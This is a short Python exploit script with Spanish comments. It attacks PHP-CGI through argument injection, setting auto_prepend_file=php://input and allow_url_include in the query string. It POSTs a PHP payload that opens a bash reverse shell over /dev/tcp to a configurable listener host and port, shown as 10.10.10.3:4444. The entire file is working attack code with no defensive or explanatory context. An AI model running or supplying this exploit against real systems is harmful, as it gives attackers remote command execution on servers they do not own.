import requests
import sys

# Configuración del listener para el reverse shell
lhost = "10.10.10.3"  # Cambiar por tu dirección IP
lport = 4444          # Cambiar por el puerto que usarás

# Payload PHP para reverse shell
reverse_shell_payload = f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"');?>"

def exploit(target_url, payload):
    # Parámetros CGI para la inyección
    params = {
        "query": "-d auto_prepend_file=php://input -d allow_url_include=1"
    }

    try:
        print("[*] Enviando payload...")
        # Enviar solicitud POST con el payload como entrada
        response = requests.post(target_url, params=params, data=payload, timeout=5)

        # Comprobar respuesta
        if response.status_code == 200:
            print("[+] Payload enviado correctamente. Revisa tu listener.")
        else:
            print(f"[-] Falló el envío. Código de estado: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error al enviar la solicitud: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <URL del objetivo>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit(target_url, reverse_shell_payload)
